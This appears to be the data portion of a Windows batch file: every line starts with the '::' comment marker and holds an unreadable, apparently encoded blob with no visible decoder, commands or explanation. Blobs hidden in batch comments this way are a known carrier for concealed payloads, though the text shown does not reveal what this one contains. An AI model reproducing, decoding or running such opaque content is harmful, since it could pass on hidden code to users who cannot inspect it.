::~~~~~uHNJ4~~~~~P~[]=~~~~~~~~~~~~~~~!nLvw~~~~~}@6HU~~~~~0H5^2~~~~~c?r-#~~~~~WHdvI~~~~~uHl#H~~~~~JnYW/~~~~~rR[@7~~~~~I$Gxx~~~~~e/fZ+~~~~~;gsGo~~~~~w1qCQ~~~~~O@Y!]~~~~~;g[sr~~~~~
::V~G9N~~~~~[$7nb~~~~~mRauX~~~~~TC_}9~~~~~c.VIZ~~~~~)3m3l~~~~~PRx#=~~~~~~gDH0~~~~~EbTp;~~~~~N[&s,~~~~~fH]2S~~~~~obY4W~~~~~E0C-s~~~~~^v4w6~~~~~;g+q{~~~~~G4N!$~~~~~,~H=!~~~~~eiPDi
::~~~~~l5G+o~~~~~x$L89~~~~~q$KUO~~~~~W43be~~~~~z35KW~~~~~B3inU~~~~~V~ulE~~~~~Pjmk&~~~~~F$A?0~~~~~X&6Rb~~~~~~~~~~~~~~~Xvr.i~~~~~/.z+6~~~~~@@@D]~~~~~Yb?0N~~~~~~~~~~~~~~~P~Q#q~~~~~
::86$^R~~~~~~~~~~~~~~~i[N.m~~~~~~~~~~~~~~~vbnTV~~~~~Y@$/N~~~~~~~~~~~~~~~c.]Fv~~~~~~~~~~~~~~~0SNGY~~~~~~~~~~~~~~~G4$(Y~~~~~.vlz/~~~~~&R_o[~~~~~6C(3H~~~~~[$K4G~~~~~C@X;e~~~~~ngGsG
::~~~~~D.x~y~~~~~143Fd~~~~~dRu^5~~~~~y.pl[~~~~~-SY-;~~~~~3g[g_~~~~~4vkYx~~~~~q$7y~~~~~~rRxRZ~~~~~j3z=2~~~~~N6~cF~~~~~~~~~~~~~~~J6Oc/~~~~~C@4Od~~~~~;dPWI~~~~~invv|~~~~~obC.7~~~~~
::q$a(p~~~~~~~~~~~~~~~EbRBg~~~~~~g7/c~~~~~~~~~~~~~~~4$vBo~TT;p4$vBo~TT;pX=1x4~TT;p|d0pW~TT;p|d0pW~TT;p~~~~~~~~~~{06KS~TT;p~~~~~~~~~~~~~~~~~~~~~H)J@~TT;p_[UUq~TT;p~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~MIHnp~TT;pnV8e,~TT;pk/Rg~k/Rg~k/Rg~k/Rg~0.&/igOs;ngp]0I~~~~~0|RbPgO42y0|Z?OgO42y|6/,Y31.Mb9T@4x9x^]{)/b|9~~~~~A$$3;2ftmm2S)W/~~~~~
::|6.@Jc^3HE9x^]{)/b|9|6.@Jc^3HiYGy8zAUaxRAK^S4)AMo[~~~~~A$$3;2S)W/~~~~~Q$vIYA7z[,A7TJ~cm__S3f^38~~~~~|6.X79|xCYt,U4V~~~~~|6.$&2nTL,}b,~fc^9fZ/^H}{t5-NEYzSnI9FtIH9TgRN)@kW73fXTM
::c^]+#~~~~~~~~~~Qoq823wl|lcY}v]0v9U-)^@)l3RthZA@Ufh}ZAOsA@Ufh3R2pj2S]t}cY}Ku0v9_HcY}LZ)?oBx9KJ4@3wSW)1En1+3wo!@~~~~~0v@(NM}UiN~~~~~~~~~~1En1+3wr$dWMbr{~~~~~Qe|H$caMlb)3[hg9Q=4(
::)pJ9Pt!OSZ9T@4&cJgl+Mwi1mcgwQ|Qb+!AAb{W=~~~~~~~~~~Qe|H$caMlb)3[hg9Q=4()pJ9Pt[LcLT{KKec#J+wTgL)?6o?IoO6!HU~~~~~mXP@V3R2pj3RcY1Ao)h^).OzSAo)a&~~~~~~~~~~Qe|H$caMlb)3[hg9Q=4()pJ9P
::t[LcLT{KKec#J+wmT63e3l#fI)3[Q.6o?IoO6!HU~~~~~Qo=y09D(T7)/b|9~~~~~Qe|H$caMlb)3[hg9Q=4()pJ9Pt[LcLT{KKec#J+wQKEWN)@!Z5cgwQ|~~~~~/YT^g9Dki@cYM#19D(t=t3DGB~~~~~Qe|H$caMlb)3[hg9Q=4(
::)pJ9Pt[LcLT{KKec#J+w/aF,$cuCKRt$9mlcgwQ|mQC#22+})Lt,U61caM&1.vUnf)L|D(t,U61caM&^9Q=4(TwLBGmQC#22+})Lt,U61caM&1|ZXEI|nl7{c^q?EAeniP~~~~~~~~~~mQC#22+})Lt,U61caM&1}p)Iv);8tp2=Ftr
::3f^S[2+m}53wo!@00$6|c&K~N9wY=UcX0CV)TWJ/ADj^DU3qUmWP-W(U3APUtEet|WiO,}WwdH?cgwQ|~~~~~Qo=cD.3/b[9DkNT}nI}gtLZQxcY}LZ|Suq.tLZQxtLqw=cY}@2cY[S!~~~~~|6.$&2nTL,}b,~fc^tAPc^JNStMs)D
::3d|Q+Wbe@n)I1J?~~~~~0v9hPcY}@2tLZ[a).OzSWEx8=.La^P9KJXttLZGZcYMk/Qoq823wl|lcY}v]0v9U-)^@)l3RthZA@Ufh}ZAOsA@Ufh3R2pj2S]t}cY}Ku0v9_HcY}LZ)?oBx9KJ4@3wSW)1En1+3wo!@|6.X79|xCYt,U4V
::6o?IyO6!HU~~~~~|e(pSzc[-s}xN^jmm!GagOs;nAKtKBAKg_;gO8)x3fX}MtErdUU2^V!9Tgp4AV&J1O6!HUgOs;ntEP^ktBMJ~AKtKBAKgr=D$C@=O6!HU~~~~~gOs;ntE/;H2+r3HAKtKBAKgr=D$C@=O6!HU~~~~~gOs;nAKtKB
::AKg_Tc^Q513fXQm9Qr[w3ftZ6cab^BDqD8-9NR[.gOs;nAKtKBAKg_;DvjH9)~ns3)~UyV9x$](AKiUV~~~~~~~~~~G,Ny3G,Ny3G,Ny_Uz[8nU3sB9tE9E6@yWWHgO8)xc/CPGA2.Z$9Q${bW.2z6U2^Q4)I(Sg)|H~7~TT;pQe|Hz
::c&Sdi|nl/ytEP@ycqgf(ca(zfAe~9p)Hr4ycaF77~~~~~Qo=cD}nlCb9$|ZZts-{V3Rte&)?oBx2S7GYtsE$2~~~~~~~~~~Qe|Hzc&Sdi|nl/ytEP@ycqghiAe5$m|nl/ytEP@ycv3MJ)IUxaQe|Hzc&Sdi|nl/ytEP@ycqg/o26z^0
::T1ouLAWh9KWP-C8tBo1{OTyooU9J~dt#b61|ezP(A$^K;c^c?63oKmVAV#n8)~1!m9wY2Vc&KK+~~~~~OTyooU9J~dt#b61A]]tyU3q=M9FK#+c&E?k9T6vV)IED}31.sVtE/~}9QS&d)pcWu3oKjW)Rf{3c&K)dt-|K(96tWwAV#+J
::|VgBMUcfR(O6!HUOTQVJtBjUY9JRfl);8npDy$.zU@xMyUA(xsc$oc7U0P#^|ezHzUtwC4)AMo[)4^y[O6!HUGFlOWG,n(BAK.SVU3[909FtIHU2SJzA]]tyDX7h39wg.btEmvU)A1MVDy$.zU3qrQcyC7k~~~~~~~~~~GFl;]G,n(B
::AK.SVU3[909FtIHU2SJz|ezPl~~~~~GFSk3G,5|0);H#T9QSJEc^7bBcKbHMAKKvG)2eb;31?E1c^q?p~~~~~~~~~~GFSiAG,5mz2+(M.t#wT;3C}H[9wb.,U3[909FtIHU2SJz9wg8stEmvUtEyAzt#ud+2+mhi~~~~~~~~~~GFltv
::G,n(/AKS7B96tR!c&K)dt-H.~9QSJEc]/AQGFSrzG,5#=c&K)dWiP4m)AsezAS5mQc^A@s|nl7{mTnf?Wc!EXU2_yscJHTQ9|#25cgwQ|GFl6=G,5#=c&K)dWiPX03CbD1c$hE~AV#n!caMlb)3[j=2=Ffb~~~~~~~~~~GFl.ZG,npN
::)3As[3g;B3AlCKDA7j}pcXzS+AdbB_3OD_6t,U4VO6!HU~~~~~GFSNcG,5)$tE/G/)A1tXUA-_g)Jc;$mTn}j31.;16june~~~~~Op9zv2Z)^U9u[M|c$R&tU2K_Tc^Ak;3_|i7c$R&@G,+Ih2q9JOU2K_Tc^Ak;3{.pu~~~~~~~~~~
::~~~~~Op9zv2Z)^U9u[M|c$R&tU2K_Tc^Ak;3_|i7c$R&=U9aUaG,+Ih}hirlc$hhiA]dviU9aUaU385m9kZg13CbGm0,lv6~~~~~~~~~~Op9zv2Z)^U9u[M|c$R&tU2K_Tc^Ak;3_|i7c$R&9G,5NutEecz9Q${Ht#ud+2+mo!Ae|1P
::YG,uQWPWSpO6!HU~~~~~~~~~~~~~~~Op9zv2Z)^U9u[M|c$R&AU0fEX[tjaeU0PUY9Ed-pc.s2gc^tA3YG5/b0c]F+2L,_QAKKvG)2eb;31?E1c^q?/Wc[DBUcfR(U0fEX[2?(lWSr(m9ww+n3CMWxWSBd.3f^SV3oK]tU9c!i0,lv6
::~~~~~|Suq.Ao)/]mXPvBAbICw!S&=J~~~~~zL/);A],tnUAGcGWPG$8cX0n6t,U61caM&FU3xZ33CEmt)A1tXU3x#@2Lk1CQe|H,tEmvU}($+qtg|G-t,U61caMvkc,?2nc&,0m)A1tXUA-+;tvuc19TYjHU2afnc^q?/cmSj,c&E?6
::[8.ho3CvszU3sg@)su?1UA0_m)3m3ltv_;1A3QI()G,+,WRWNsA7ihz3UZZy9Q]Hk3f^SV3oey13oK)tc&K)dt-|NUUAGe03{L]ptEmvU)An|6)Lqq}A$]p6tEj!&~~~~~|S#cy|t6LlmXO3n|S=]F1En1+3wSW)1En1+3wo!@cJHTQ
::9|#2yA78s}t#wQk3f^SVU3xZ3gO#A!~~~~~}om;LcX0CV)TW2T9|J$-3f^SV3R@80}b,~fc^c?XAddXKcX0TPUz[MvO6!HU}o}5rc&KNSAf(],9,(RS}(=#J9F0R@}o}5rc&KNycX0bBU9=}{WPW_|);!bHc^qis)I-E0~~~~~~~~~~
::9wY=UcX0CV)TWBg)TWm;A]dviU3xZ331?Ezc&KNycX0n6Ae~9p3wo!@O6!HU|nl7{c^q?/|!/~Z6o?I,3kI,]~~~~~0|Z?O|nl7{c^q?/|ezH.Uz!u;~~~~~0.&/imJlp]c&Ei;ASn_8)TWrzc$hwBAKKvG)AMo[UAfxBcaL$gcKbHM
::Ae~9p)~1r9)Asdy/##r]cgwQ|0|Z?O|nl7{c^q?/|nl7wc&KNwAKg_}c^+jO6o?IoU0pSlWtBs-.u7vntEmvU/m@2Y2+mhi~~~~~~~~~~.MD6htEmvU31?E1c^q?p~~~~~~~~~~.MD6htEmvU31?E1c^q?/);!bHcaG2Lc1E^X~~~~~
::}hirltEmvU/m@2Y2+BIqU0cOdW&z3Z}hirltEmvUt#ud+2+BL!)ly?,c&?9I~~~~~~~~~~|n4S#)8Y7/cafiK)TWpXU3sB!3{{48AK1,l~~~~~mT63e3odICAKSR!t!vY$c/WNp)An|B3f^SV3oe(V2+BI/AbS-T|ZXEI|nl7{c^qy,
::~~~~~mFYdz3CMY~)sk?5c?Al19T@BPA@4h||Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73RtD9tLZGZQbNAV9$m(r.3/C1tsE^))/b|9~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73RtD9tLZGZc1iZ7WMbr{
::~~~~~~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73RtD9tLZGZc1iZ7WMbr{DYcY3tLqCWt361a~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73Rct;A@UfhtLqbq9D(;AWMbP#3RthZDYcY3tLqCWt361a
::~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73RcCM3wSx$DYcY3tLqCWt361a~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73RtD9tLZGZQbNAV9$}tV|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM7
::3RcY1Ao)Q7cY}@2cY}^7DYcY3tLqCWt361a~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73Rct;)^@=Lt3[^AA@UfhtLqR2Ao)Q7cY[S!~~~~~|Suu||Suq.Ao)-ocY}6@).G-uc1?#VtLqCWA@UM73Rc?.Ab{_aMEf58
::AbS-T|H?[BA@UM7~~~~~~~~~~TTgy|2tDMuAo)(SA@4h|1En1+3wo!@Q]wV!2nTKE)2e~#A]dvi/^HghTUX}ucv;Q+cZ2Frc1E^X~~~~~U9?ihc/WNpUt6R;c$R;T}(=#J9F0b]Bo(F-Bo(F-Bo(F-Bo(F-Bo(F-Bo(F/~~~~~~~~~~
::}ov{Y)2e3nAeksb2nAXCQK}GI)8K$}~~~~~~~~~~mFYdz3CMY~)s(sfAVv!RAKHTt}yxQxAe~9p)G1&9tE_.|~~~~~0rD,d|K|8xm.3c9[sMV6|nl7{mTnC]3UZ?L3C}H[9wb.,|nl7{c^q?)}(=#J9FcMq}o}5{3CMf^Uz!u;~~~~~
::~~~~~|nl7{mTnC3tEP^x9QSJEcqgclWP-W(/^g(mA$$?Q2S)W/~~~~~0.(=#2np@PUtiV.)4^ymWtBs-~~~~~|nl7{mTnCcc^JlR2!J,k/^Hgh3CG}1tE9Ec}(=#J9FcMq}o}5{3CM{?~~~~~mxv{ZQ]k?K)L=b4~~~~~.vU@qQ]k?K
::)L=b4~~~~~.vU3xQ]k?K)L=b4~~~~~Qelu+|q;=.)sv[c9F0R@zswpkcv~s_AKis!cv6a.tEeHt}ov{Y)2diJ2+6aYzswpkcv~s_AKis!cv6a.tEeHtzswpkc#ltqcY[S!}(=!W)2e@S)sv[c9Fc1qAKP,x)s;twcafFpc#ltqcv756
::~~~~~0|RbP}b,~fc^cyItEP@49w1lfA],@O)L/]/3CMeQc/gUGO6!HU~~~~~n;U3}~~~~~~RR6G2tU0m0_zO|0hu!b~~~~~n;U3}~~~~~OnN/g43cUM{2f7v{9bjm~~~~~n;U3}~~~~~PXgcV$3Q1&N+g^eNe9f$~~~~~n;U3}~~~~~
::P$Y7D~~~~~~~~~~~~~~~~~~~~~~~~~[bk~o~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~GI[y@~TT;p~~~~~~~~~~~~~~~~~~~~Go2lN
::~TT;p8K=3p~TT;p~~~~~~~~~~~~~~~~~~~~~~;4p~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~Ub.k~TT;p~~~~~~~~~~~~~~~~~~~~HMwv?~TT;pUtH/;~TT;pgwJU[~TT;pUW$-S~TT;p~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~8Sj#.~TTgG8+RN$DgGhq}(o$p8Sj#.d-FU;
::|Ww!vc[jAKwc)RJ4D?,-o^PifO.7BKB@3Z24$b$ks;aOG9,X-,~H)^^^)!Lp}i2h#Yn#gYTl}Rf[@6lRQYG(lZ./-hdLWELhs=(3ZMYIZ~TT;p}^a]u)8$tM0Sj2NAK.Wk/#&^MWP3m8YG9UkQ]kcSTU^$^tEmvN|K4K~2n~r40jA-D
::2Z)^U9JUV.!N3in2+mOwc&Pv!9wOVg9|25Vcm0Zz~~~~~1v]K31v]K3Gv#nssb?kzm,N}=~pS1!U0TCFDi8o=)T-l9~~~~~U9G?1[@6lRDi8o=)T-l91xJyuTl}Rf[@6lRDi8o=)TEs[~sZjFGv-H1Dyy5s)2@)u~~~~~Go2l4gn{M]
::D+e(+cyqsAXZVw#Gv#nsD5nZ.1o,3p~~~~~6sSeRGv#nsD5nZ.1o,3pMElEfMomjIGv#nsD5nZ.1o,3Q~~~~~/MK$NGv#nsD5nZ.1o,R8~~~~~|K90?Gv#nsD5nZ.1o,R8MElEfzc?[pGv#nsD5nZ.1o,R8}Z9sd@w]P;Gv#nsD5nZ.
::1o,Rc~~~~~tZp,[Gv#nsD5nZ.1o,ED~~~~~3svL|Gv#nsD5nZ.1o,EY~~~~~WoUatGv#nsD5nZ.1oyG6~~~~~7Mo)7Hgs_!D5nZ.1oyG=~~~~~#cC1o3pL6#D?-$[)20V=~Ub.60vz{8D?-$[)2@WTAekZBc1E^X0_zO|p.aR8D?-$[
::)2@W9Y@kU[ts+?6@(?ocGv#nsD?EHA1h|.K~~~~~tu]q]Gv#nsD?EHA1hQX2~~~~~31G9vGv#nsD?EHA1o]HF~~~~~W_&6hGv#nsD?EHA1o]wZ~~~~~7/1H{g54W=Di=?/)20V=R1[qmNSVTaDyy5s)2@)q~~~~~$uNfn43cUMDyy5s
::)2@)Z~~~~~vb[,8Gv-H1Dyy5s)2@)#~~~~~^v4w6JlOEpDyy5s)2@)v~~~~~~VhP=Mv2C{Dyc2B9Di.gMIH+m3~@|tDyD,2~~~~~~X9X_~~T6OD?h@X)20V=~[4QE^3pwED?EG&953LI~~~~~^xs/f-L1R2D?EG&953LL~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~@[VcsC97-8!m-[~TL34p9T8N~z?cmPww4.OGNDjG0fJhs4K)eHy]zDHn0,aHCygFOoY8W}i2h#7gMnusHnhjG,~Rb~_{^a}i2h#MvJ?C~0heT8DfC{H&oD8~00Iz4})3h46G1/4D^NE
::42oJEUJP?]pImS/@-La9&!?ROnULMEU^q$t@-La9&!?ROnULME~0opt8D(_t81v2~81@ZEH3pH}ObCalUJP?]p-6-o3pw@vZGsY?8n4;#U^q$t3pw@vZGsY?8n4;#U^qvA~mx0J3pw@vZGsY?8n4;#sss3bUGZYe;k8=8H)l!KPUG@k
::GS=GxGGW|p}i2h#U.FEY~01WmH^azNOw9TCUJP?]pLk(=~P_;qB(Yr}Z1H2yUJP?]pE?5KB(Yr}mB_3zv(ErPU^q$tB(Yr}mB_3zv(ErPU^qvA~gcWW~P_;qB(Yr}Z1H2yU^q$t~P_;qB(Yr}Z1H2y~z?cmPFWy)PEz]5PEUZ6sHTMv
::G7iY9}i2h#z.HzOsHwfoPM_f~P]klt}i2h#WvmlAs81j+4Km~/4LKgaGS=GxGGW|p}i2h#h^Z?WsH3c^Gf+]r~Ca10}i2h#/1wxnUJP?]pogInnPug[MFw@0}b[n4UJP?]pImw@MFw@0YyfJOzA&kQUJc1=Goq@/YyfJOrBFjS2+k8#
::U^q$tYyfJOrBFjS2+k8#U^q$tMFw@0YyfJOzA&kQU^q$tnPug[MFw@0}b[n4~~~~~~TT;p~Tw^;pb}}}Gy]B@PFW(YPEz#EP?Zda^$R0J~RR6GPM_PfHntj+Tl}RfHntj+mu(DWz0l4hTl}RfHntj+~Tw^;pb}}x~z/C1OpTEm~zDKV
::GSlHep8[X{G,|/DpT,NW^$R0J~TT;pO^7Uduw7{A)@KNUuw7{A~TZ.P~LD5k~zSD6PM_9-PM71{~0ufT4KT$P4L-K3GGW|p~zcwXO/IFeO/qNs~z?cmPFW-3PEz)nP+Sm+~TT;p~~~~~~TT;p~TZ.P~_{^a~~~~~~TL34pQ!_mKuJo+
::~~~~~~~~~~$v9UyMhF)_vb[,8~~~~~~~~~~146ef~sZjFXvm~E~~~~~~~~~~=6;2Fvw;+L7/f7N~~~~~~~~~~Ebn9D-hxTr|nv]/~~~~~~~~~~P~qr#_M3Q1=n32i~~~~~~~~~~D.I4?yM.Md31hdR~~~~~~~~~~|6vrTKqqx$z3p}@
::~~~~~~~~~~)3rSfle-86_/x37~~~~~~~~~~v@ZTDUcw!0R1qI|~~~~~~~~~~_.9?vHMn$Vvb3O;~~~~~~~~~~Kv&QF~sLdk~~~~~~~~~~~~~~~~~~~~~~~~~?v8~B~~~~~Nn3WF~~~~~fHr#I~~~~~_/FRq~~~~~x$[IQ~~~~~uHNJ4
::~~~~~P~[]=~~~~~~~~~~~~~~~!nLvw~~~~~}@6HU~~~~~0H5^2~~~~~c?r-#~~~~~WHdvI~~~~~uHl#H~~~~~JnYW/~~~~~rR[@7~~~~~I$Gxx~~~~~e/fZ+~~~~~;gsGo~~~~~w1qCQ~~~~~O@Y!]~~~~~;g[sr~~~~~V~G9N~~~~~
::[$7nb~~~~~mRauX~~~~~TC_}9~~~~~c.VIZ~~~~~)3m3l~~~~~PRx#=~~~~~~gDH0~~~~~EbTp;~~~~~N[&s,~~~~~fH]2S~~~~~obY4W~~~~~E0C-s~~~~~^v4w6~~~~~;g+q{~~~~~G4N!$~~~~~,~H=!~~~~~eiPDi~~~~~l5G+o
::~~~~~x$L89~~~~~q$KUO~~~~~W43be~~~~~z35KW~~~~~B3inU~~~~~V~ulE~~~~~Pjmk&~~~~~F$A?0~~~~~X&6Rb~~~~~~~~~~~~~~~Xvr.i~~~~~/.z+6~~~~~@@@D]~~~~~Yb?0N~~~~~~~~~~~~~~~P~Q#q~~~~~86$^R~~~~~
::~~~~~~~~~~i[N.m~~~~~~~~~~~~~~~vbnTV~~~~~Y@$/N~~~~~~~~~~~~~~~c.]Fv~~~~~~~~~~~~~~~0SNGY~~~~~~~~~~~~~~~G4$(Y~~~~~.vlz/~~~~~&R_o[~~~~~6C(3H~~~~~[$K4G~~~~~C@X;e~~~~~ngGsG~~~~~D.x~y
::~~~~~143Fd~~~~~dRu^5~~~~~y.pl[~~~~~-SY-;~~~~~3g[g_~~~~~4vkYx~~~~~q$7y~~~~~~rRxRZ~~~~~j3z=2~~~~~N6~cF~~~~~~~~~~~~~~~J6Oc/~~~~~C@4Od~~~~~;dPWI~~~~~invv|~~~~~obC.7~~~~~q$a(p~~~~~
::~~~~~~~~~~EbRBg~~~~~~g7/c~~~~~~~~~~~~~~~]$3GZ)c}r{)I-xr9QSJEc#g|wiHeO62n5cjYO~JkACljLc#2g03Rt+JmFYd.9T}Zo3Cvsz~~4q!mFYdz3CMW&cm^lE)sFTSU.WH3)9!!-3fXg!|nl7{c^qy,qGSyoAKS7_9QSJE
::cY60W|ZXEI|nl7{c^qy,s@Z3@)9!!-3fXg!}(irv9wbjXWb5(WdX~4_9ik!02npOp~~4-QmFYdz3CMY~)sk?5c?Al19T@BPA@;oz/mCB$mRZ4#~~4e.mFYdz3CMY~)sk?L~~sbb}ov{Y)2e3nAeksb2nAXCQK}GI)8K$}~~pej|nl7{
::c^q?$!DQA;)t/WtX{8TyAe~9p)G1&9tE_.|TwCsp/mCB$}G|9J9KjB3mFYdz3CMY~)skEL9QE[Ym$v8-)92)N)9X(RcudAC9FtIH~~p/)}(=#J9FcMq}o}5{3CM{?LRDcYc&^rEmxvrqMEC?$Qelu+AeQ,h)sv[c9F0R@1,])-tE,?J
::tEP0_C[lBuc&^rEmxvrqTwKL[mRZ4#Q]k?K)L=b4~~s~_.vU3xQ]k?K)L=b4~~~EQ}(=!W)2diJ2+}o7C6O{h9|R/])sv[c9F0R@^s+AFA]Cjx)sv[c9Fclc.!QL&m/1$,Dycdm~~~L/|ZXEI|nl7{c^q?EAeniP~~HbpQ]k$0c^JkS
::2nkQjWo#-)cg1h@t!OSZ9T@4&cJgl+TwC(|Q]k$DcafFpcu}^rmT+E};wy^Q26z^0T1ouLAWh9KWP-C8tBo1{hMFz/Ae5$m|nl/ytEP@ycv3MJ)IUxaAbn]@)t~X?ca(8Rc?Al19T@BPA@sk5Tltu&!WJ&y2+k8#GvaBz}j#y&c&K)d
::t-8=L9QSJEc^9fZsojMu9ksNBcab^kcJPSw3g1KBA@8jx@j]QC3CuLD)2DJ89FtxOtE9Ew9wYm1cJH|kB?KW[AX4.!~~OPeQY}]-/uqRV!fl#,2+k8#8t9w&2npOp~~~~~@j]M#3CfoHAd,4C)L8r+~wb_/);8w1Ad&~,AD)6D@oiPG
::3f^3McCZM0@j]-wc/1k+9wYBOAKDi;)sY[93f^3Mc,S^oZRzgt3C1t8Abl)=tBoXwA$o~r^Lt|Y)8.Xm@ov[]9D(953CCM.~~GNF9T@)P~~~^[@j]-wc/1k+9wYBOAKDi;);AaAtE/Os~~Gm{@o^dE@hBpN)2K$pcJPfd}68c}c^x.K
::31SXUYG&TiGEyz0)8$Y.)8$tD9T@X?3Cqgr8Sr?vAKXXOt}c}U@o4|,3C}DD9Tgp8~~pe^@h#2E)AMXpt,#0(A]]&UAN1vpA$SLmAKX34A$W5hgndJec^x.yA7z619Q$|N9Tg21W9Ui~WP-b/A7LkH).p6~@h#2E)3AsmAGC$i@h#2E
::)3AsmAginaTTg^^tE5z^1}[8lW_qmpQbN.Yc^x.-ADRww~~~gP@j]fo@j]MltB2?cp^xy|3;Eko9Tgp8~~~Cm@j,hEtE5z^4LI^Z@hU]w).pY8@o$l5tEetg3{ZiP3fDon@h5j59Q$|lW_8M5)2KS[)2DZd2n~v+9FbH3GvaBcAKXXO
::t}mNgc&^UCAe~6EcY67W@o^eG@o4W~@hklEcY[L[@j]fo@jyp-ADRww~~p+J@h#2E)AMXpt,#0(AKXg[tE,l89|)P{~~GUS@o$l5tEetg3{Z{HcJPi[@hB)b9wb)4A@8lj@jyUb@j_PKW_qmpts,Of3CGZV9T@H_9Q?iBAXP|vtEMqB
::3CL,Yc&^#X2fr=wDq7eK2+k8#9Q?iBAXP|vtEMqB3CL,a)2S;8Da,gyXeW86c/YHl9Q?iBAXP|vtEMqB3CL,a)3[sMtVriaDqa+[Dycdm~~OWYtez!2DJ8?YD&wN2DaDN2tE_gXAV&J1Da,gyXeW86c/YHl9Q?iBAXP|vtEMqB3CL,2
::AKXLX3CL,=XeWU6X7},u2S],Itez!2DJ8?YD&wN2D^ub#)AM^4Da,gyXeW86c/YHl9Q?iBAXP|vtEMqB3CL,q9T@Xm2fr=wDq7eK2+k8#9Q?iBAXP|vtEMqB3CL,=Ae~6EcqPlvDqa+[Dycdm~~8#uQ$vIt9Qiz[3fVJxA$$Ym).8s~
::Q$vI$AK.3}38B(K9wb)4A)7Wf3dmRfnwn/P2Khm5)3qGVTW,piA]LI]lSdIJt#ud+2+mgWWr-T8)AMo[mxvr_c^9fZ]NHfl)t;6E9QSJEc&yMa9FtxOtE9EhtEP,H3RArmTUJsetEm9OcudAC9FtIH~~Pwr/^&l$Ae~9p)sv8Nc&^_4
::3fD4Kc^q)G).G[cQX@W5WbD4,c?Al19QS&d}om;f)2K],U^fD))9!!-3fXg!|nl7{c^q?{c1,yRmFYdX)Lqq}A$7n-3fDon/&FKO?sI3y)c,]U)2KQNtEV3])PX-rcv6c_cY}RZ/^H}{t5-NEYzlG$tEecec&^;=$L{yK}($+qtB-dw
::|nl1Ncaban7Yc0v)c}r{)I-xr9QSJEcv756~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~C~Q]@tP}-_!/Thj&BcmQk/Rg~~TT;p~TT;p~RR6GXg2Mi~~~~~~QYZ?~~~~~~TT;p~TT;p~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~HVeNcc]y+c7/1H{3p3~=Zzo4nZUwz,#|xtEyd-dOu_=Xb~pK[[0/Ob|J+^EX@-Rq@~0Wq}l+Zn=HDM;3T0M3MemykL@-La9&!?ROnULME&!?RO/D[Us?uU9U/D[Us3pw@vG_kA@3pw@v
::ZGsY?8n4;#ZGsY?|s#O6XuljN|s#O6c7-]7}bsCHc7-]7nbPNkT1[]}nbPNkdqLsC}bsCHnG[&F~P_;qtu&a7~P_;qB(Yr}Z1H2yB(Yr}mB_3zv(ErPmB_3zqIpnVjAme.qIpnVxlFK7l+R?qxlFK7r-P=oC(LJSr-P=ol)^@f5AUIF
::l{?YCZ9f1!?uB)1#zlWB[AU(XpAeHTMxTO|Mx3;Q4u,{=Mx3;QNUR=1gb/-LnPug[MFw@0}b[n4MFw@0YyfJOzA&kQYyfJOrBFjS2+k8#rBFjSJfx?q7/0[CJfx?qRcBW&u_lzpRcBW&j(K(RJ+NG[j(K(RIIq[Eo(?ltnPf.Bw_zY&
::{A|+x~H)^^ru],Lf_&mo_[U;f{06ewZUwz,{06ewnc!Y}ZUwz,50gC.@?m?{e/1;f@?m?{3S~NkZUwz,)0jObRHBu^f_&moRHBu^Y/h{44v~NqY?|ks,MzF3;1uoJy[|mYVMFM1ZUwz,D[,uD)oX|Gf_&moWR1JHpGi/_f_&mop@}cS
